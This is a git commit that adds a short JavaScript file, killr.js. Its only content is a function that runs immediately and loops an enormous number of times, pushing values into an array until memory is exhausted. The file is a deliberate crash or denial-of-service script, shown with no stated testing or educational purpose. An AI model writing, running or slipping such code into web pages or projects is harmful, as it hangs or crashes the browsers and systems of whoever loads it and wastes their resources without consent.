2167a5a8309a57666f67f63e32bc2e7bd0f1e810
themirrazz <89490659+themirrazz@users.noreply.github.com>
2022-06-07 10:29:32 -0700

    Create killr.js

---
+++ killr.js
@@ -0,0 +1,18 @@
+function ohSnap() {
+  var corruptable=[]
+  for(var i=0;i<(9999999*999999999999999999999);i++) {
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+    corruptable.push(i);
+  }
+}
+
+ohSnap()
